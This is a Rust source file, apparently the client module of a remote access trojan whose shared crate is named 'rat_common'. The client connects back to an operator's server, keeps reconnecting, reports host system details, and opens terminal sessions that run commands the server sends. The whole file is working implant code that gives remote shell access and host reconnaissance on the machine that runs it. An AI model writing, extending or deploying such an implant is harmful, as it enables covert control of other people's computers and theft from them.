use std::collections::{HashMap, VecDeque};
use std::sync::Arc;
use std::time::Duration;

use async_trait::async_trait;
use log::{debug, error, info, warn};
use rat_common::framework::{ModuleImpl, ModuleState};
use rat_common::reader::Reader;
use rat_common::schema::{
    ClientMessage, ClientMessageData, ServerMessage, ServerMessageData, SessionCreateRequest,
    SystemInfo,
};
use rat_common::snowflake::SnowflakeId;
use sysinfo::System;
use tokio::io::AsyncWriteExt;
use tokio::net::TcpStream;
use tokio::net::tcp::{OwnedReadHalf, OwnedWriteHalf};
use tokio::sync::Mutex;
use tokio::time::sleep;

use crate::UniversalSocketAddr;
use crate::sessions::terminal::TerminalSession;
use crate::sessions::{Session, SessionImpl};

pub struct Client {
    _addr: UniversalSocketAddr,
    _reader: Mutex<Reader<OwnedReadHalf>>,
    _writer: Mutex<OwnedWriteHalf>,
    _total_read_buf: Mutex<VecDeque<u8>>,
    _sessions: Mutex<HashMap<SnowflakeId, Arc<dyn Session>>>,
    _system: Mutex<System>,
    _state: Arc<ModuleState>,
}

impl Client {
    pub async fn connect(addr: UniversalSocketAddr) -> Self {
        let (reader, writer) = Self::_reconnect(&addr).await;

        let mut system = System::new_all();
        system.refresh_all();

        Self {
            _addr: addr,
            _reader: Mutex::new(reader),
            _writer: Mutex::new(writer),
            _total_read_buf: Mutex::new(VecDeque::new()),
            _sessions: Mutex::new(HashMap::new()),
            _system: Mutex::new(system),
            _state: ModuleState::new(),
        }
    }

    async fn _reconnect(addr: &UniversalSocketAddr) -> (Reader<OwnedReadHalf>, OwnedWriteHalf) {
        loop {
            match TcpStream::connect(addr).await {
                Ok(stream) => {
                    let (reader, writer) = stream.into_split();
                    return (Reader::new(reader), writer);
                }
                Err(e) => {
                    let wait = Duration::from_millis(5000); // TODO: Exponential backoff + random jitter
                    warn!("Unable to connect to server: {e}. Retrying in {wait:?}...");
                    sleep(wait).await;
                }
            }
        }
    }

    async fn _process_message(
        self: Arc<Self>,
        message: ServerMessage,
    ) -> anyhow::Result<ClientMessage> {
        debug!("Received message from server: {message:#?}");
        let id = message.id;
        match message.data {
            ServerMessageData::Ping => Ok(ClientMessage {
                id,
                data: ClientMessageData::Pong,
            }),
            ServerMessageData::SystemInfoQuery => Ok(ClientMessage {
                id,
                data: ClientMessageData::SystemInfoQueryResponse {
                    info: SystemInfo {
                        boot_time: System::boot_time(),
                        cpu_arch: System::cpu_arch(),
                        distribution_id: System::distribution_id(),
                        host_name: System::host_name(),
                        kernel_long_version: System::kernel_long_version(),
                        kernel_version: System::kernel_version(),
                        long_os_version: System::long_os_version(),
                        name: System::name(),
                        open_files_limit: System::open_files_limit(),
                        os_version: System::os_version(),
                        physical_core_count: System::physical_core_count(),
                        uptime: System::uptime(),
                    },
                },
            }),
            ServerMessageData::SessionQuery => Ok(ClientMessage {
                id,
                data: ClientMessageData::SessionQueryResponse {
                    sessions: self
                        ._sessions
                        .lock()
                        .await
                        .values()
                        .map(|s| s.metadata())
                        .collect(),
                },
            }),
            ServerMessageData::SessionCreate { request } => {
                let mut sessions = self._sessions.lock().await;
                let session = match request {
                    SessionCreateRequest::Terminal => {
                        let session = TerminalSession::new(Arc::downgrade(&self)).await?;
                        let metadata = session.metadata();

                        let session = Arc::new(session);
                        self.add_submodule(session.clone()).await;
                        sessions.insert(metadata.id, session);

                        metadata
                    }
                };

                Ok(ClientMessage {
                    id,
                    data: ClientMessageData::SessionCreateResponse { session },
                })
            }
            ServerMessageData::SessionInput { session_id, input } => {
                let sessions = self._sessions.lock().await;
                match sessions.get(&session_id) {
                    Some(session) => {
                        session.input(input).await?;
                        Ok(ClientMessage {
                            id,
                            data: ClientMessageData::SessionInputResponse,
                        })
                    }
                    None => anyhow::bail!("Received input for non-existent session {session_id}"),
                }
            }
            ServerMessageData::SessionStateQuery { session_id } => {
                let sessions = self._sessions.lock().await;
                match sessions.get(&session_id) {
                    Some(session) => Ok(ClientMessage {
                        id,
                        data: ClientMessageData::SessionStateQueryResponse {
                            data: session.query_current_state().await?,
                        },
                    }),
                    None => anyhow::bail!("Received input for non-existent session {session_id}"),
                }
            }
        }
    }

    pub async fn send(&self, message: &ClientMessage) -> anyhow::Result<()> {
        let data = postcard::to_stdvec_cobs(message)?;

        let mut writer = self._writer.lock().await;
        writer.write_all(&data).await?;
        Ok(())
    }
}

#[async_trait]
impl ModuleImpl for Client {
    type EventType = anyhow::Result<usize>;

    fn name(&self) -> &str {
        "Client"
    }

    fn state(&self) -> Arc<ModuleState> {
        self._state.clone()
    }

    async fn listen(self: Arc<Self>) -> Self::EventType {
        let mut reader = self._reader.lock().await;
        Ok(reader.read().await?)
    }

    async fn handle(self: Arc<Self>, event: Self::EventType) -> anyhow::Result<()> {
        let mut size = 0;
        let closed = match event {
            Ok(0) => true,
            Ok(s) => {
                size = s;
                false
            }
            Err(e) => {
                error!("Error when reading from server: {e}");
                true
            }
        };

        if closed {
            error!("Server disconnected. Reconnecting...");

            let (new_reader, new_writer) = tokio::select! {
                pair = Self::_reconnect(&self._addr) => pair,
                _ = self.wait_until_stopped() => {
                    return Ok(());
                }
            };

            info!("Reconnected to server");

            let mut reader = self._reader.lock().await;
            let mut writer = self._writer.lock().await;
            let mut total_read_buf = self._total_read_buf.lock().await;

            *reader = new_reader;
            *writer = new_writer;
            total_read_buf.clear();
        }

        let reader = self._reader.lock().await;
        let mut total_read_buf = self._total_read_buf.lock().await;
        let mut offset = total_read_buf.len();

        total_read_buf.extend(reader.prefix(size));
        while offset < total_read_buf.len() {
            if total_read_buf[offset] == 0 {
                let mut frame = total_read_buf.drain(..=offset).collect::<Vec<u8>>();
                offset = 0;

                let self_c = self.clone();
                tokio::spawn(async move {
                    match postcard::from_bytes_cobs::<ServerMessage>(&mut frame) {
                        Ok(message) => {
                            let id = message.id;
                            match self_c.clone()._process_message(message).await {
                                Ok(response) => {
                                    let _ = self_c.send(&response).await;
                                }
                                Err(e) => {
                                    error!("Error processing message from server: {e}");
                                    let _ = self_c
                                        .send(&ClientMessage {
                                            id,
                                            data: ClientMessageData::Error {
                                                message: e.to_string(),
                                            },
                                        })
                                        .await;
                                }
                            }
                        }
                        Err(e) => {
                            error!("Received malformed message from server: {frame:02X?} ({e})");
                        }
                    }
                });
            } else {
                offset += 1;
            }
        }

        Ok(())
    }

    async fn submodules_remove_hook(self: Arc<Self>) -> anyhow::Result<()> {
        let mut sessions = self._sessions.lock().await;
        sessions.retain(|_, session| session.is_running());
        Ok(())
    }
}
